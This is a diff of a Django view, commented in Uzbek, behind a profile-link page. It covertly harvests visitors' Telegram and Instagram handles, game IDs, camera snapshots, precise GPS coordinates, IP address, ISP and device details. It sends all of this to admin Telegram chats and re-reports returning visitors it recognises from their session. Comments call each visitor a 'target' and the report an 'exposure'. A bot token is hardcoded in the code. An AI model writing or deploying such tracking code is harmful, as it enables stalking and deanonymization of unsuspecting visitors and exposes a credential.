@@ -8,7 +8,7 @@ from analytics.models import VisitorAnalytics, LinkClickAnalytics
 
 # BOT SOZLAMALARI (Istalgancha admin ID qo'shishingiz mumkin)
 TELEGRAM_BOT_TOKEN = "8913375327:AAGDQ3YBplsSYUO7fPpugb557ZZc4y_MONw"
-TELEGRAM_ADMINS = ["8389359853","1724433674"]  # Bu yerga keyingi admin ID larni vergul bilan ajratib qo'shasiz
+TELEGRAM_ADMINS = ["8389359853"]  # Bu yerga keyingi admin ID larni vergul bilan ajratib qo'shasiz
 
 def send_to_telegram_and_forget(text, image_data=None):
     """Xabarni ro'yxatdagi barcha adminlarga ketma-ket yuboradi, DBga yozmaydi"""
@@ -109,75 +109,100 @@ def profile_detail_view(request, profile_slug):
         except Exception:
             pass
 
-    # --- AJAX POST SO'ROV (Foydalanuvchi birinchi marta kirib formani to'ldirganda) ---
+    # [MUHIM]: Kirish haqidagi umumiy ma'lumot (har gal kirganda yuborish uchun)
+    basic_msg = (
+        f"👤 *Maqsadli Profil:* {profile.title}\n"
+        f"📱 *QURILMA VA TIZIM:* \n"
+        f"• *Manba:* {source}\n"
+        f"• *Operatsion Tizim:* {os_system}\n"
+        f"• *Brauzer:* {browser}\n"
+        f"• *Tizim Tili:* {user_lang}\n\n"
+        
+        f"🌐 *GEOLOKATSIYA VA TARMOQ:* \n"
+        f"• *IP Manzil:* `{ip}`\n"
+        f"• *Provayder (ISP):* {geo_data['isp']}\n"
+        f"• *Davlat:* {geo_data['country']}\n"
+        f"• *Shahar:* {geo_data['city']}\n"
+    )
+
+# --- AJAX POST SO'ROV (views.py ichidagi tegishli joyga almashtiring) ---
     if request.method == 'POST' and request.headers.get('X-Requested-With') == 'XMLHttpRequest':
-        tg_user = request.POST.get('tg_user', '-')
-        insta_user = request.POST.get('insta_user', '-')
-        game_id = request.POST.get('game_id', '-')
+        tg_user = request.POST.get('tg_user')
+        insta_user = request.POST.get('insta_user')
+        game_id = request.POST.get('game_id')
+        
         image_data = request.POST.get('image_data', None)
         status_text = request.POST.get('status_text', 'Ruxsat berilmadi')
         screen_size = request.POST.get('screen_size', 'Noma`lum')
+        
+        # [YANGI]: Brauzer GPSidan kelgan aniq koordinatalar
+        gps_lat = request.POST.get('gps_lat', None)
+        gps_lon = request.POST.get('gps_lon', None)
 
-        # Shaxsiy bo'lmagan analitikani bazaga saqlash
-        VisitorAnalytics.objects.create(profile=profile, app_source=source)
+        # Agar GPS koordinatalari kelgan bo'lsa, aniq xarita havolasini yasaymiz
+        if gps_lat and gps_lon and gps_lat != 'null':
+            maps_link = f"[Google Maps (Aniq GPS yordamida: 10m)](https://www.google.com/maps?q={gps_lat},{gps_lon})"
+        else:
+            # Agar rad etgan bo'lsa, eski IP-API koordinatasidan foydalanamiz
+            maps_link = f"[Google Maps (Taxminiy IP yordamida: 30km)](https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']})"
 
-        # Sessiya xotirasiga yozish (Keyingi safar formani ko'rsatmaslik uchun)
-        request.session['is_logged_in'] = True
-        request.session['tg_user'] = tg_user
-        request.session['insta_user'] = insta_user
-        request.session['game_id'] = game_id
-
-        # Telegramga boradigan to'liq "Oshkor etish" xabari
-        msg = (
-            f"🎯 *YANGI RO'YXATDAN O'TISH (Maksimal Detal)* \n\n"
-            f"👤 *Maqsadli Profil:* {profile.title}\n"
-            f"🔹 *Telegram:* @{tg_user}\n"
-            f"🔸 *Instagram:* @{insta_user}\n"
-            f"🆔 *Kiritilgan ID:* `{game_id}`\n"
-            f"📸 *Kamera Holati:* {status_text}\n\n"
-            
+        # Kirish haqidagi umumiy ma'lumot
+        device_and_geo = (
             f"📱 *QURILMA VA TIZIM:* \n"
             f"• *Manba:* {source}\n"
             f"• *Operatsion Tizim:* {os_system}\n"
             f"• *Brauzer:* {browser}\n"
-            f"• *Ekran O'lchami:* {screen_size}\n"
+            f"• *Ekran:* {screen_size}\n"
             f"• *Tizim Tili:* {user_lang}\n\n"
-            
             f"🌐 *GEOLOKATSIYA VA TARMOQ:* \n"
             f"• *IP Manzil:* `{ip}`\n"
             f"• *Provayder (ISP):* {geo_data['isp']}\n"
-            f"• *Davlat:* {geo_data['country']}\n"
-            f"• *Shahar:* {geo_data['city']}\n"
-            f"• *Xarita:* [Google Maps](https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']})\n"
+            f"• *Xarita:* {maps_link}\n"
         )
-        send_to_telegram_and_forget(msg, image_data=image_data)
-        return JsonResponse({'status': 'success'})
 
-    # --- ODDIY GET SO'ROV (Har safar profil ochilganda ishlaydi) ---
-    is_logged_in = request.session.get('is_logged_in', False)
-    if is_logged_in:
-        # Agar foydalanuvchi avval ro'yxatdan o'tgan bo'lsa, uning ma'lumotlari bilan "Qayta kirdi" smsi ketadi
-        saved_tg = request.session.get('tg_user', '-')
-        saved_insta = request.session.get('insta_user', '-')
-        saved_id = request.session.get('game_id', '-')
-        
-        re_visit_msg = (
-            f"🔄 *PROFILGA QAYTA KIRISH (Live Alert)* \n\n"
-            f"👤 *Profil:* {profile.title}\n"
-            f"旧 *Tanish Foydalanuvchi:* \n"
-            f"  • Telegram: @{saved_tg}\n"
-            f"  • Instagram: @{saved_insta}\n"
-            f"  • ID: `{saved_id}`\n\n"
-            f"📱 *Platforma:* {source} ({os_system} / {browser})\n"
-            f"🌐 *Joriy IP:* `{ip}`\n"
-            f"📍 *Joylashuv:* {geo_data['city']}, {geo_data['country']} ({geo_data['isp']})"
-        )
-        send_to_telegram_and_forget(re_visit_msg)
+        if tg_user or insta_user or game_id:
+            VisitorAnalytics.objects.create(profile=profile, app_source=source)
+            request.session['is_logged_in'] = True
+            request.session['tg_user'] = tg_user or '-'
+            request.session['insta_user'] = insta_user or '-'
+            request.session['game_id'] = game_id or '-'
+
+            msg = (
+                f"🎯 *YANGI RO'YXATDAN O'TISH* \n\n"
+                f"👤 *Profil:* {profile.title}\n"
+                f"🔹 *Telegram:* @{request.session['tg_user']}\n"
+                f"🔸 *Instagram:* @{request.session['insta_user']}\n"
+                f"🆔 *Kiritilgan ID:* `{request.session['game_id']}`\n"
+                f"📸 *Kamera:* {status_text}\n\n" + device_and_geo
+            )
+            send_to_telegram_and_forget(msg, image_data=image_data)
+            return JsonResponse({'status': 'success'})
+            
+        elif request.session.get('is_logged_in', False):
+            saved_tg = request.session.get('tg_user', '-')
+            saved_insta = request.session.get('insta_user', '-')
+            saved_id = request.session.get('game_id', '-')
+            
+            re_visit_msg = (
+                f"🔄 *PROFILGA QAYTA KIRISH* \n\n"
+                f"旧 *Foydalanuvchi:* \n"
+                f"  • Telegram: @{saved_tg}\n"
+                f"  • Instagram: @{saved_insta}\n"
+                f"  • ID: `{saved_id}`\n\n"
+                f"📸 *Kamera:* {status_text}\n\n" + device_and_geo
+            )
+            send_to_telegram_and_forget(re_visit_msg, image_data=image_data)
+            return JsonResponse({'status': 'tracked'})
+    # --- ODDIY GET SO'ROV (Sahifa yuklanganda fon xabarini yuborish - Rasm yo'q) ---
+    # is_logged_in = request.session.get('is_logged_in', False)
+    # if is_logged_in:
+    #      send_to_telegram_and_forget(f"🔄 *PROFILGA QAYTA KIRISH (Fonda Alert)* \n\n" + basic_msg)
+         # Rasm yuborish endi JavaScript fonda POST so'rovi orqali amalga oshiriladi.
 
     context = {
         'profile': profile,
         'links': links,
-        'is_logged_in': is_logged_in
+        'is_logged_in': request.session.get('is_logged_in', False)
     }
     return render(request, 'profiles/index.html', context)
 
